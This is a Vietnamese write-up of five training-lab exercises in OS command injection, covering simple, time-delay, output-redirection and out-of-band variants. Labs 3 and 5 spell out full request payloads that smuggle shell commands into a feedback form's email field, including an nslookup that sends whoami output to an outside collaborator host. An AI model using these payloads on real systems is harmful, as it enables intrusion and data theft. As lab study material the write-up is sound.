# OS COMMAND INJECTION WRITEUP

## Lab 1: OS command injection, simple case

![](https://i.imgur.com/MYBr2LW.png)

Trang web chứa lỗ hổng `Command injection` trong chức năng kiểm tra số lượng sản phẩm còn lại. Biết rằng hệ thống sử dụng các tham số productId và storeId yêu cầu từ người dùng trả về kết quả sau khi thực thi lệnh `shell` tại server. Để giải quyết bài lab, chúng ta cần thực thi lệnh `whoami` trả về kết quả người dùng hiện tại trong server.

-Tại mục xem chi tiết sản phẩm, chức năng **Check stock** cho phép người dùng kiểm tra số lượng đơn hàng còn lại trong kho. Ta sử dụng burp suite để quan sát request. Chúng ta thấy request sử dụng phương thức POST truyền tới hệ thống hai tham số productId và storeId. Hai giá trị này có thể thay đổi tùy ý bởi người dùng.

![](https://i.imgur.com/WOUQVOn.png)

Do hệ thống truyền trực tiếp giá trị các tham số này vào câu lệnh `shell`, nên chúng ta có thể thay đổi giá trị nhằm thực thi lệnh `shell` tùy ý, chẳng hạn: Thực thi lệnh `id` xem user ID (uid), `group ID` nhóm (gid) và các nhóm mà họ là thành viên.

![](https://i.imgur.com/oAGY70h.png)

 Để giải quyết bài lab, chúng ta cần thực thi lệnh `whoami` trả về kết quả người dùng hiện tại trong server. Vì thế ta sẽ tiến hành sử dụng `|` để ngắt câu lệch và chuyền `whoami` để giải quyết bài lab

 ## Lab 2: Blind OS command injection with time delays

 ![](https://i.imgur.com/H0OtiJN.png)

- Trang web chứa lỗ hổng `Command injection` dạng blind trong chức năng feedback từ người dùng, tuy nhiên output không được hiển thị. Biết rằng hệ thống thực thi lệnh `shell` tại server với các tham số đầu vào từ người dùng. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng khiến hệ thống bị delay trong `10 giây`
- Chức năng `Submit feedback` cho phép người dùng nhập các trường `name, email, subject, messsage`. Những giá trị này được truyền tới hệ thống qua phương thức `POST`:

    ![](https://i.imgur.com/ioHf8zu.png)
 - Ở đây tôi có biết 1 câu lệnh khiến hệ thống ngủ 10 giây là: sleep 10. Vì vậy tôi sẽ tìm cách chèn nó vào:
 
    ![](https://i.imgur.com/155AlqP.png)
Ta thu được thời gian phải hồi là hơn 10 giây
    ![](https://i.imgur.com/ZLHJGCL.png)

## Lab 3: Blind OS command injection with output redirection

![](https://i.imgur.com/j3Ia0Ht.png)

- Để giải bài lab,thực hiện lệnh `whoami` và truy xuất kết quả.
- Ở đây là `output redirection` nên ta sẽ phân tích source 1 chút, chúng ta sẽ thấy hình ảnh được load lên bởi src=/image?filename=something.jpg

![](https://i.imgur.com/yQUgLrt.png)

Quay trở lại cái `form feedback`, chúng ta vẫn bắt lại request cũ và sửa lại thành
``` 
csrf=WdJgsNq7lhOxrWj7Wi0wvp1IlTKihtk4&name=admin&email=admin%40gmail.com+||+whoami>/var/www/images/output.txt+||+&subject=os+command+injection&message=n%2Fa%0A
```
// /var/www là folder chứa souce của web

![](https://i.imgur.com/gfGA06U.png)

- Quay ra trang chủ bắt 1 request load image và sửa lại tên filename thành tên file output.txt xem đã thực hiện thành công chưa.

![](https://i.imgur.com/SbReUJB.png)

![](https://i.imgur.com/XKsQfDV.png)

## Lab 4: Blind OS command injection with out-of-band interaction

![](https://i.imgur.com/YGC2kV0.png)

- Vẫn cách cũ nhưng lab này đã note là nên sử dụng `burp collaborator` (một công nghệ cho phép Burp phát hiện ra các lỗ hổng vô hình trên máy chủ) để poll ra những request connect tới

![](https://i.imgur.com/3MTat8e.png)

chúng ta sẽ nhận được những request đã connect tới

![](https://i.imgur.com/lQ31bb3.png)

## Lab 5: Blind OS command injection with out-of-band data exfiltration

![](https://i.imgur.com/3v8kimm.png)

- Vẫn thực hiện lại cách như lab 4, nhưng ở đây ta sẽ nối thêm `whoami` để lấy user

```
csrf=t4ggn9SP7kdomgEgX3tUouw5llXrNIoU&name=admin&email=admin%40gmail.com+||nslookup+`whoami`.v1x0ee89vinn7adybxzt885t8kej28.oastify.com+||&subject=os+command+injection&message=n%2Fa
```

![](https://i.imgur.com/D5CYbQI.png)

user: peter-xQ568l

![](https://i.imgur.com/PH07rMo.png)